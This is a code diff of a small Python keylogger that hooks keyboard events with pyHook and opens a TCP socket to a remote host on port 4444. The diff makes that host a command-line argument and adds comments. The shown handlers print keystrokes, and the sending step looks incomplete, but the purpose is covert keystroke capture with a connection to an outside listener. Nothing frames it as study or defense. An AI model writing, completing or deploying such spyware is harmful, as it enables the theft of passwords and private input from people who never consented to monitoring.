@@ -1,11 +1,14 @@
-import pyHook, socket, pythoncom, argparse
+# Surprior, 2017
+
+import pyHook, socket, pythoncom, sys
 from threading import Thread, Lock
 
-HOST = "10.0.0.63"
+HOST = sys.argv[1]
 PORT = 4444
 
 lock = Lock()
 
+# Handler using Thread and Lock
 def kb_handler_thread(c):
 	lock.acquire()
 	print(c)
@@ -18,8 +21,9 @@ def kb_handler(e):
 		t.start()
 	except:
 		pass
-	return True #e.KeyID
+	return True
 
+# Simpler version 
 def kb_handler2(e):
 	lock.acquire()
 	print(e.Key)
@@ -28,7 +32,6 @@ def kb_handler2(e):
 	return True
 
 if __name__ == '__main__':
-	
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((HOST, PORT))
 	
@@ -36,3 +39,5 @@ if __name__ == '__main__':
 	hm.KeyDown = kb_handler2
 	hm.HookKeyboard()
 	pythoncom.PumpMessages()
+	
+	s.close()
